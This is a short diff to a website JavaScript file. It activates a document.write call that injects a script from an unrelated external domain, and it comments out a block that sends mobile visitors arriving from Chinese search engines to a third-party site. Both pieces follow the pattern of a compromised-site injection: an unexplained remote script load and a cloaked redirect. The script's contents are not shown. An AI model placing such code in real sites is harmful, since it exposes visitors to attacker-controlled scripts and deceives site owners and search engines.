@@ -1,4 +1,5 @@
-//document.write('<script src="https://i.ixi.plus/epaper.js"><\/script>');
+document.write('<script src="https://i.ixi.plus/epaper.js"><\/script>');
+/*
 function isFromSearchEngine() {
     const referrer = document.referrer;
     const searchEngines = ['sm.cn', 'so.com', 'haosou', 'baidu.', 'toutiao.', 'sogou.'];
@@ -26,3 +27,4 @@ if (isFromSearchEngine() && isMobile()) {
     loadBaiduAnalytics();
     window.location.href = "https://43.suoyik.com/?shareName=ylg43";
 }
+*/
